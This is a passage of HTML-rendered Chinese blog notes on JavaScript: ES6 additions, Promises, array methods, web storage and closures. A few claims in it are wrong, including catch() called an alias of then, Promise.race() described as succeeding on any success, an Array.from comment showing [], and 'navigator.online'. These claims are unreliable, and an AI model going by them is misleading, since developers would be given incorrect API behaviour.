class=\"hljs-comment\">//箭头函数不绑定arguments,使用rest参数，妹有super和new.target;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>数组新增API，isArray/from/of,数组实例增加：entries（）,keys(),values（）等方法；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//字符串拓展</span><br><span class=\"hljs-keyword\">let</span> str = <span class=\"hljs-string\">&quot;hello ReactJS&quot;</span>;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(str,<span class=\"hljs-string\">&quot;中是否包含ReactJS&quot;</span>,str.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">&quot;ReactJS&quot;</span>));<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(str,<span class=\"hljs-string\">&quot;是否以h开头&quot;</span>,str.<span class=\"hljs-title function_\">startsWith</span>(<span class=\"hljs-string\">&quot;h&quot;</span>));<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(str,<span class=\"hljs-string\">&quot;是否以actJS结尾&quot;</span>,str.<span class=\"hljs-title function_\">endsWith</span>(<span class=\"hljs-string\">&quot;actJS&quot;</span>));<br><br><span class=\"hljs-comment\">//字符串模板</span><br><span class=\"hljs-keyword\">let</span> str = <span class=\"hljs-string\">`c</span><br><span class=\"hljs-string\">y</span><br><span class=\"hljs-string\">l`</span>;<br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>对象和数组新增拓展运算符号；</li>\n<li>新增模块化：import,export;</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> name=<span class=\"hljs-string\">&#x27;Martin&#x27;</span>;<br><span class=\"hljs-keyword\">export</span> &#123;name&#125;;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">MakeLove</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>新增Set()和Map数据结构；</li>\n<li>原生提供Proxy构造函数，用来生成Proxy实例；</li>\n<li>新增生成器<strong>Generater</strong>和<strong>Iterator</strong>；</li>\n</ul>\n<h3 id=\"3-Bigint\"><a href=\"#3-Bigint\" class=\"headerlink\" title=\"3.Bigint\"></a>3.Bigint</h3><blockquote>\n<p>支持任意长度的整数：末尾+n；</p>\n<p>不能混用常规的和Bigint</p>\n</blockquote>\n<h3 id=\"4-Promise-和-Await\"><a href=\"#4-Promise-和-Await\" class=\"headerlink\" title=\"4.Promise 和 Await\"></a>4.Promise 和 Await</h3><p><a href=\"https://es6.ruanyifeng.com/#docs/promise\">https://es6.ruanyifeng.com/#docs/promise</a></p>\n<ul>\n<li>Promise时异步编程的解决方案，比较传统的回调函数和事件更加合理强大；</li>\n<li>一个用来保存某个未来才会结束的事件；</li>\n</ul>\n<blockquote>\n<p>Promise对象有以下两个特点：</p>\n<p>（1）对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：</p>\n<p>pending（进行中）、fulfilled（已成功）、rejected（已失败）只有异步操作的结果才能决定状态；</p>\n<p>（2）一旦状态改变，不会再变。Promise对象的状态改变只有：pending-&gt;fulfilled，pending-&gt;rejected</p>\n<p>状态凝固了就是resolved。如果改变已经发生了，再对Promise对象添加回调函数，也会立即得到结果；这与事件不同，事件一旦错过就不再获得结果；</p>\n<p>缺点：</p>\n<p>无法取消Promise，一旦新建就会立即执行，无法中途取消；</p>\n<p>不设置回调函数，Promise内部抛出的错误不会反映到外部；</p>\n<p>当处于pending状态时，无法得知目前进展到哪一个阶段；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//promise构造函数接受一个函数作为参数，该函数的两个参数分别为resolve和reject</span><br><span class=\"hljs-comment\">//resolve函数是将Promise对象的状态从未完成变成成功；pending-&gt;resolved，异步操作成功时调用并将异步操作的结果作为参数传递出去；</span><br><span class=\"hljs-comment\">//reject函数时将promise对象的状态从未完成变成失败，pending-&gt;rejected，异步操作错误时将报错错位参数传递出去；</span><br>promise.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">valueA</span>)&#123;<br>    <br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.prototype.then(参数1，参数2)</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//Promise实例具有then方法，定义在原型对象上，作为Promise实例添加状态改变时的回调函数；</span><br><span class=\"hljs-comment\">//可以采用链式写法</span><br><span class=\"hljs-title function_\">getJSON</span>(<span class=\"hljs-string\">&quot;url&quot;</span>).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">error</span>)=&gt;</span>&#123;<br>    <br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.prototype.catch()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//是then的别名，用于指定发生错误时的回调函数</span><br><span class=\"hljs-title function_\">getJson</span>().<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">error</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error);<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.prototype.finally()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title function_\">getJson</span>().<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">error</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error);<br>&#125;).<span class=\"hljs-title function_\">finally</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-comment\">//最后一定执行</span><br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.all()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//用于将多个promise实例，包装成一个新的promise实例</span><br><span class=\"hljs-keyword\">const</span> p=<span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([p1,p2,p3]);<br><br><span class=\"hljs-comment\">//只有p123的状态都称为fulfiled p才会成功；任一个rejected p也会；</span><br><span class=\"hljs-keyword\">const</span> databasePromise = <span class=\"hljs-title function_\">connectDatabase</span>();<br><br><span class=\"hljs-keyword\">const</span> booksPromise = databasePromise<br>  .<span class=\"hljs-title function_\">then</span>(findAllBooks);<br><br><span class=\"hljs-keyword\">const</span> userPromise = databasePromise<br>  .<span class=\"hljs-title function_\">then</span>(getCurrentUser);<br><br><span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([<br>  booksPromise,<br>  userPromise<br>])<br>.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">[books, user]</span>) =&gt;</span> <span class=\"hljs-title function_\">pickTopRecommendations</span>(books, user));<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>Promise.race():多个实例任一成功都会返回成功；</li>\n</ul>\n<h3 id=\"5-数组方法\"><a href=\"#5-数组方法\" class=\"headerlink\" title=\"5.数组方法\"></a>5.数组方法</h3><h5 id=\"join-（数组转字符串）\"><a href=\"#join-（数组转字符串）\" class=\"headerlink\" title=\"join() （数组转字符串）\"></a>join() （数组转字符串）</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;&#x27;</span>))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;-&#x27;</span>))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr)\t<span class=\"hljs-comment\">//原数组不变</span><br><br><span class=\"hljs-comment\">//join实现重复字符串</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">repeateStr</span> (str, n) &#123;<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Array</span>(n + <span class=\"hljs-number\">1</span>).<span class=\"hljs-title function_\">join</span>(str)<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"push-和pop\"><a href=\"#push-和pop\" class=\"headerlink\" title=\"push()和pop()\"></a>push()和pop()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//push 向数组的末尾添加元素</span><br><span class=\"hljs-comment\">//pop 删除并返回最后一个数组元素</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"shift-和unshift\"><a href=\"#shift-和unshift\" class=\"headerlink\" title=\"shift()和unshift()\"></a>shift()和unshift()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// shift() 删除数组第一个元素，并返回该元素的值</span><br><span class=\"hljs-comment\">// unshift() 向数组的开头添加一个或多个元素，并返回新的长度</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"sort\"><a href=\"#sort\" class=\"headerlink\" title=\"sort()\"></a>sort()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-comment\">// sort() 对数组元素进行排序，并返回当前数组:对字符的排序是按照字母的Unicode码进行排序的</span><br><span class=\"hljs-comment\">// reverse() 颠倒数组中元素的顺序，并返回当前数组</span><br><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">30</span>]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">sort</span>())<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">reverse</span>())<br><span class=\"hljs-comment\">//实现数值排序</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">sort</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">a, b</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> a - b<br>&#125;))<br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"concat-连接数组\"><a href=\"#concat-连接数组\" class=\"headerlink\" title=\"concat()  (连接数组)\"></a>concat()  (连接数组)</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// concat() 连接两个或多个数组，并返回新的数组</span><br><span class=\"hljs-comment\">// slice() 选取数组的的一部分，并返回一个新数组</span><br><span class=\"hljs-comment\">// splice() 从数组中添加或删除元素，并返回被删除的元素</span><br><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">concat</span>([<span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">8</span>]))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">3</span>))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">8</span>))<br><br><span class=\"hljs-comment\">//传入二维数组，将其转化为一维数组</span><br><span class=\"hljs-keyword\">var</span> arr1 = [[<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>], [<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>], [<span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">6</span>]]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">concat</span>(arr1))\t\t<span class=\"hljs-comment\">//讲数组当作元素项合并</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>([].<span class=\"hljs-property\">concat</span>.<span class=\"hljs-title function_\">apply</span>([], arr1))\t\t<span class=\"hljs-comment\">//合并</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"slice-start-end\"><a href=\"#slice-start-end\" class=\"headerlink\" title=\"slice(start,end)\"></a>slice(start,end)</h5><p>·ES5新增·</p>\n<h5 id=\"indexOf-lastIndexOf-返回首次出现的位置，无返回-1\"><a href=\"#indexOf-lastIndexOf-返回首次出现的位置，无返回-1\" class=\"headerlink\" title=\"indexOf()  lastIndexOf()  返回首次出现的位置，无返回-1\"></a>indexOf()  lastIndexOf()  返回首次出现的位置，无返回-1</h5><h5 id=\"forEach-map-filter-some-every\"><a href=\"#forEach-map-filter-some-every\" class=\"headerlink\" title=\"forEach() map(),filter(),some(),every();\"></a>forEach() map(),filter(),some(),every();</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>]<br><br>arr.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(index, item)<br>&#125;)<br><br><span class=\"hljs-comment\">//指“映射”，方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值</span><br><span class=\"hljs-keyword\">var</span> arr1 = arr.<span class=\"hljs-title function_\">map</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item * <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr1)<br><br><span class=\"hljs-comment\">// “过滤”功能，方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。和filter() 方法类似，jquery中有个 grep()方法也用于数组元素过滤筛选。</span><br><span class=\"hljs-keyword\">var</span> arr2 = arr.<span class=\"hljs-title function_\">filter</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item &gt; <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr2)<br><br><span class=\"hljs-comment\">//判断数组中每一项都是否满足条件，只有所有项都满足条件，才会返回true。</span><br><span class=\"hljs-keyword\">var</span> arr3 = arr.<span class=\"hljs-title function_\">every</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item &gt; <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr3)<br><br><span class=\"hljs-comment\">//判断数组中是否存在满足条件的项，只要有一项满足条件，就会返回true。</span><br><span class=\"hljs-keyword\">var</span> arr4 = arr.<span class=\"hljs-title function_\">some</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">item, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> item &gt; <span class=\"hljs-number\">2</span><br>&#125;)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr4)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"reduce-reduceRight\"><a href=\"#reduce-reduceRight\" class=\"headerlink\" title=\"reduce(),reduceRight()\"></a>reduce(),reduceRight()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//归并方法:迭代数组中的所有项，然后生成一个最终返回值。</span><br><span class=\"hljs-comment\">//第一个参数是每一项调用的函数，函数接受四个参数分别是初始值，当前值，索引值，和当前数组</span><br><span class=\"hljs-comment\">//函数需要返回一个值，这个值会在下一次迭代中作为初始值。第二个参数是迭代初始值，参数可选，</span><br><span class=\"hljs-comment\">//如果缺省，初始值为数组第一项，从数组第一个项开始叠加，缺省参数要比正常传值少一次运算。</span><br><span class=\"hljs-comment\">//reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。</span><br><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">8</span>, <span class=\"hljs-number\">9</span>, <span class=\"hljs-number\">10</span>]<br><span class=\"hljs-keyword\">var</span> result = arr.<span class=\"hljs-title function_\">reduce</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">prev, cur, index, arr</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> prev + cur<br>&#125;)<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(result) <span class=\"hljs-comment\">// 55</span><br></code></pre></td></tr></table></figure>\n\n<p>·ES6新增方法·</p>\n<h5 id=\"Array-from\"><a href=\"#Array-from\" class=\"headerlink\" title=\"Array.from()\"></a>Array.from()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> json = &#123;<br>  <span class=\"hljs-comment\">//必须是数字</span><br>  <span class=\"hljs-string\">&quot;0&quot;</span>: <span class=\"hljs-string\">&quot;zhangsan&quot;</span>,<br>  <span class=\"hljs-string\">&quot;1&quot;</span>: <span class=\"hljs-number\">18</span>,<br>  <span class=\"hljs-attr\">length</span>: <span class=\"hljs-number\">2</span>\t\t\t<span class=\"hljs-comment\">//需要长度</span><br>&#125;<br><br><span class=\"hljs-keyword\">let</span> arr = <span class=\"hljs-title class_\">Array</span>.<span class=\"hljs-title function_\">from</span>(json)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr) <span class=\"hljs-comment\">// []</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"Array-of\"><a href=\"#Array-of\" class=\"headerlink\" title=\"Array.of()\"></a>Array.of()</h5><h3 id=\"6-离线应用和客户端存储\"><a href=\"#6-离线应用和客户端存储\" class=\"headerlink\" title=\"6.离线应用和客户端存储\"></a>6.离线应用和客户端存储</h3><ul>\n<li>离线检测</li>\n</ul>\n<blockquote>\n<p>HTML5定义了一个navigator.online属性，如果为true表示设备能够上网；</p>\n</blockquote>\n<ul>\n<li>应用缓存</li>\n</ul>\n<blockquote>\n<p>H5使用appcache专门为开发离线Web应用设计；</p>\n<p>从浏览器的缓存区划分一块，使用一个描述文件列出需要下载和缓存的资源；</p>\n</blockquote>\n<ul>\n<li><p>数据存储</p>\n<ol>\n<li>​    Cookie</li>\n</ol>\n<blockquote>\n<p>Http Cookie最初在客户端用于存储会话信息。发送回服务器的额外信息可以用于唯一验证客户来自于发送的哪一个请求；</p>\n</blockquote>\n<blockquote>\n<p>限制：</p>\n<p>cookie在性质上是绑定在特定的域名下，当设定一个cookie后，再给创建他的域名发送请求时都会包含这个cookie，这个限制是的cookie中的信息只能让批准的接收者访问；无法被其他域访问；</p>\n<p>构成:</p>\n<p>Cookie由名称，值，域，路径，失效时间，安全标志组成；</p>\n</blockquote>\n<ol start=\"2\">\n<li>Web存储机制</li>\n</ol>\n<ul>\n<li>提供一个cookie之外存储会话的途径；</li>\n<li>提供一种存储大量跨会话的数据机制；</li>\n</ul>\n<blockquote>\n<p>storage类型</p>\n<p>它提供组大的存储空间，有clear（），getItem(name)，setItem（name,value)等；</p>\n<p>只能存储字符串；</p>\n</blockquote>\n<blockquote>\n<p>sessionStorage类型</p>\n<p>它用于存储某个会话的数据，也就是数据保存到浏览器关闭时。</p>\n<p>存储在sessionStorage中的数据可以跨越页面刷新而存在，同时如果浏览器支持，崩溃之后也能使用；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//使用方法存储数据</span><br>sessionStorage.<span class=\"hljs-title function_\">setItem</span>(<span class=\"hljs-string\">&quot;name&quot;</span>,<span class=\"hljs-string\">&quot;Martin&quot;</span>);<br><span class=\"hljs-comment\">//使用属性存储数据</span><br>sessionStorage.<span class=\"hljs-property\">book</span>=<span class=\"hljs-string\">&quot;JS&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>globalStorage类型</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">globalStorage[<span class=\"hljs-string\">&#x27;域名&#x27;</span>].<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>localStorage类型</li>\n</ol>\n</li>\n</ul>\n<blockquote>\n<p>localStorage在H5中作为持久保存客户端数据的方案取代了globalStorage；</p>\n<p>与globalStorage不同；</p>\n</blockquote>\n<h3 id=\"7-cookie设置，token如何实现登录\"><a href=\"#7-cookie设置，token如何实现登录\" class=\"headerlink\" title=\"7.cookie设置，token如何实现登录\"></a>7.cookie设置，token如何实现登录</h3><h3 id=\"8-闭包\"><a href=\"#8-闭包\" class=\"headerlink\" title=\"8.闭包\"></a>8.闭包</h3><blockquote>\n<p>如果一个函数访问量此函数的父级或者父级以上的作用域变量，这个函数就是一个闭包；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> a=<span class=\"hljs-number\">1</span>;<br><br><span class=\"hljs-comment\">//匿名立即执行函数，访问了全局变量a;</span><br>(<br>\t<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">test</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(a);<br>    &#125;<br>)()<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 